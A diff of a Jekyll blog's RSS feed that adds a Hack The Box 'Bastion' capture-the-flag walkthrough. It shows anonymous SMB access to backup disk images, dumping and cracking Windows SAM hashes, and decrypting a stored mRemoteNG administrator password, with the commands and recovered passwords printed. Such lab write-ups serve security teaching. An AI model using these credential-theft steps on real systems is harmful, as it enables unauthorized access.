@@ -1,13 +1,254 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Carte Noire</title>
-    <description>A dark blog theme for Jekyll.</description>
-    <link>http://carte-noire.jacobtomlinson.co.uk//</link>
-    <atom:link href="http://carte-noire.jacobtomlinson.co.uk//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 19 Jan 2019 17:28:38 -0500</pubDate>
-    <lastBuildDate>Sat, 19 Jan 2019 17:28:38 -0500</lastBuildDate>
+    <title>phaz0n</title>
+    <description>A blog</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Wed, 25 Sep 2019 19:27:37 -0400</pubDate>
+    <lastBuildDate>Wed, 25 Sep 2019 19:27:37 -0400</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Bastion</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/bastion/infocard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
+Nmap scan report for 10.10.10.134
+Host is up (0.053s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE      VERSION
+22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -32m09s, deviation: 1h09m14s, median: 7m48s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-09-22T14:34:30+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-09-22 08:34:28
+|_  start_date: 2019-09-22 08:32:24
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Not much to look into aside from SMB.&lt;/p&gt;
+
+&lt;h1 id=&quot;enumerating-smb&quot;&gt;Enumerating SMB&lt;/h1&gt;
+
+&lt;p&gt;It’s always worth testing to see if SMB permits null (aka anonymous) sessions. &lt;strong&gt;We need a share&lt;/strong&gt; to try authenticating to first. So we list out the shares.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# smbclient -L \\10.10.10.134
+Enter WORKGROUP\root's password:
+    Sharename       Type      Comment                                                                                           
+    ---------       ----      -------                                                                                           
+    ADMIN$          Disk      Remote Admin                                                                                      
+    Backups         Disk                                                                                                        
+    C$              Disk      Default share                                                                                     
+    IPC$            IPC       Remote IPC 
+    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ADMIN$&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt; are all default shares. &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; is the only one that stands out. I attempt to authenticate to it with no credentials.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# smbclient \\\\10.10.10.134\\Backups
+Enter WORKGROUP\root's password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Tue Apr 16 06:02:11 2019
+  ..                                  D        0  Tue Apr 16 06:02:11 2019
+  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
+  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019
+
+                7735807 blocks of size 4096. 2745314 blocks available&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Our null session worked. We have read access to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; share.&lt;/p&gt;
+
+&lt;p&gt;Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowsImageBackup&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&amp;gt; dir
+  .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
+  ..                                  D        0  Fri Feb 22 07:45:32 2019                                                          
+  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019                                                
+  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019                                              
+  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
+                                                            
+  &amp;lt; . . . snip . . . &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;VHD files? Definitely something to look at. But &lt;code class=&quot;highlighter-rouge&quot;&gt;5418299392&lt;/code&gt; blocks? That’s over &lt;em&gt;two terabytes&lt;/em&gt;. We need a way to enumerate the VHDs without downloading them entirely.&lt;/p&gt;
+
+&lt;h1 id=&quot;mounting-shares-and-vhd-files&quot;&gt;Mounting shares and VHD files&lt;/h1&gt;
+
+&lt;p&gt;If we mount the share, we can view it as if it were part of our own file system.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
+Password for anonymous@//10.10.10.134/Backups:  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bastion/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install &lt;code class=&quot;highlighter-rouge&quot;&gt;guestmount&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# apt-get install libguestfs-tools&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then we create a new directory as the mountpoint.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# mkdir vhd1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we mount the VHD file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# guestmount --add &quot;/root/HTB/Bastion/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&quot; --inspector --ro /root/HTB/Bastion/vhd1 -v&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can browse through the file system as if it were part of our own.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bastion/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Note: One of the VHD files wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Now with read access to the VHD, my first instinct is to go for the &lt;strong&gt;flags&lt;/strong&gt;, but there’s nothing at &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\L4mpje\Desktop&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop&lt;/code&gt;. So we clearly don’t have the right access just yet.&lt;/p&gt;
+
+&lt;p&gt;Next thing to do would be to search for &lt;strong&gt;user credentials&lt;/strong&gt; (remember the open SSH port?). After we’ve checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.&lt;/p&gt;
+
+&lt;h1 id=&quot;sam-and-security&quot;&gt;SAM and SECURITY&lt;/h1&gt;
+
+&lt;p&gt;Depending on your version of Windows, these can be in a few different locations. Here, they’re in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\config&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# dir
+&amp;lt; . . . snip . . . &amp;gt;
+SAM
+SAM.LOG
+SAM.LOG1
+SAM.LOG2
+SECURITY
+&amp;lt; . . . snip . . . &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I copy them from the mounted drive to my Kali box.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SAM /root/HTB/Bastion
+root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SYSTEM /root/HTB/Bastion&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;To get the hashes, I use &lt;code class=&quot;highlighter-rouge&quot;&gt;samdump2&lt;/code&gt; and pass the &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SAM&lt;/code&gt; files as arguments.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# samdump2 SYSTEM SAM -o hashes.txt
+root@kali:~/HTB/Bastion# cat hashes.txt
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The L4mpje hash takes seconds to crack with &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The password for use L4mpje is &lt;strong&gt;bureaulampje&lt;/strong&gt;. The Administrator and Guest account hashes are marked as &lt;code class=&quot;highlighter-rouge&quot;&gt;*disabled*&lt;/code&gt;, so this is the best we’ll get.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bastion/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To get in, we &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;strong&gt;L4mpje@10.10.10.134&lt;/strong&gt; with the recovered password.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# ssh L4mpje@10.10.10.134
+L4mpje@10.10.10.134's password: 
+
+Microsoft Windows [Version 10.0.14393]                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                            
+
+l4mpje@BASTION C:\Users\L4mpje&amp;gt;    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The user flag is on L4mpje’s Desktop.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;l4mpje@BASTION C:\Users\L4mpje&amp;gt;type Desktop\user.txt                            
+9bfe############################                                                   &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;privilege-escalation-mremoteng-credentials&quot;&gt;Privilege Escalation: mRemoteNG Credentials&lt;/h1&gt;
+
+&lt;p&gt;With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; stands out.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;l4mpje@BASTION C:\&amp;gt;dir &quot;Program Files (x86)&quot;                                    
+ Volume in drive C has no label.                                                
+ Volume Serial Number is 0CB3-C487                                              
+
+ Directory of C:\Program Files (x86)                                            
+
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          .                                           
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          ..                                          
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Common Files                                
+23-02-2019  10:38    &amp;lt;DIR&amp;gt;          Internet Explorer                           
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Microsoft.NET                               
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          mRemoteNG                                   
+23-02-2019  11:22    &amp;lt;DIR&amp;gt;          Windows Defender                            
+23-02-2019  10:38    &amp;lt;DIR&amp;gt;          Windows Mail                                
+23-02-2019  11:22    &amp;lt;DIR&amp;gt;          Windows Media Player                        
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Windows Multimedia Platform                 
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Windows NT                                  
+23-02-2019  11:22    &amp;lt;DIR&amp;gt;          Windows Photo Viewer                        
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Windows Portable Devices                    
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          WindowsPowerShell                           
+               0 File(s)              0 bytes                                   
+              14 Dir(s)  11.244.994.560 bytes free                              &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can find the version number in the changelog file and look for a known exploit, but this doesn’t get us very far.&lt;/p&gt;
+
+&lt;p&gt;A search for “mRemoteNG stored credentials”, however, results in &lt;a href=&quot;http://hackersvanguard.com/mremoteng-insecure-password-storage/&quot;&gt;exactly what we’re looking for&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As the post shows, we can find an encrypted password (right beside &lt;strong&gt;Username=”Administrator”&lt;/strong&gt;) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Node&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Descr=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Panel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Domain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Hostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From here, you can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to &lt;a href=&quot;http://hackersvanguard.com/mremoteng-insecure-password-storage/&quot;&gt;blog post&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;What worked best for me was &lt;a href=&quot;https://github.com/haseebT/mRemoteNG-Decrypt&quot;&gt;mRemoteNG_Decrypt.py&lt;/a&gt;. I copied the encrypted password and passed it as a string to get the plaintext credential.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# python3 mremoteng_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
+Password: thXLHM96BeKL0ER2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From here, we simply have to SSH in as Administrator.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# ssh Administrator@10.10.10.134
+Administrator@10.10.10.134's password: &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And the root flag is in Administrator’s Desktop folder.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;administrator@BASTION C:\Users\Administrator&amp;gt; type Desktop\root.txt                                                             
+9588############################&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Sat, 19 Jan 2019 13:02:19 -0500</pubDate>
+        <link>http://localhost:4000/writeup/2019/01/19/bastion-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/writeup/2019/01/19/bastion-writeup/</guid>
+        
+        <category>hackthebox</category>
+        
+        <category>writeup</category>
+        
+        <category>walkthrough</category>
+        
+        
+        <category>writeup</category>
+        
+      </item>
     
       <item>
         <title>Welcome to Carte Noire</title>
@@ -25,8 +266,8 @@ but with the hosting and maintenance simplicity of Jekyll.&lt;/p&gt;
 
 </description>
         <pubDate>Mon, 23 Mar 2015 11:31:19 -0400</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/03/23/welcome-to-carte-noir/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/03/23/welcome-to-carte-noir/</guid>
+        <link>http://localhost:4000/jekyll/2015/03/23/welcome-to-carte-noir/</link>
+        <guid isPermaLink="true">http://localhost:4000/jekyll/2015/03/23/welcome-to-carte-noir/</guid>
         
         <category>welcome</category>
         
@@ -133,8 +374,8 @@ or add, features.&lt;/p&gt;
 
 </description>
         <pubDate>Tue, 10 Jun 2014 08:31:19 -0400</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/10/carte-noire-in-action/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/10/carte-noire-in-action/</guid>
+        <link>http://localhost:4000/jekyll/2014/06/10/carte-noire-in-action/</link>
+        <guid isPermaLink="true">http://localhost:4000/jekyll/2014/06/10/carte-noire-in-action/</guid>
         
         <category>demo</category>
         
@@ -162,8 +403,8 @@ and &lt;a href=&quot;http://en.wikipedia.org/wiki/Textile_(markup_language)&quot
 &lt;p&gt;Learn more about Jekyll on their &lt;a href=&quot;http://jekyllrb.com/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
 </description>
         <pubDate>Mon, 09 Jun 2014 08:32:18 -0400</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/09/so-what-is-jekyll/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/09/so-what-is-jekyll/</guid>
+        <link>http://localhost:4000/jekyll/2014/06/09/so-what-is-jekyll/</link>
+        <guid isPermaLink="true">http://localhost:4000/jekyll/2014/06/09/so-what-is-jekyll/</guid>
         
         <category>about</category>
         
@@ -217,8 +458,8 @@ the android thumbnail.&lt;/p&gt;
 
 </description>
         <pubDate>Sun, 08 Jun 2014 08:32:18 -0400</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/08/using-thumbnails/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/08/using-thumbnails/</guid>
+        <link>http://localhost:4000/jekyll/2014/06/08/using-thumbnails/</link>
+        <guid isPermaLink="true">http://localhost:4000/jekyll/2014/06/08/using-thumbnails/</guid>
         
         <category>thumbnails</category>
         
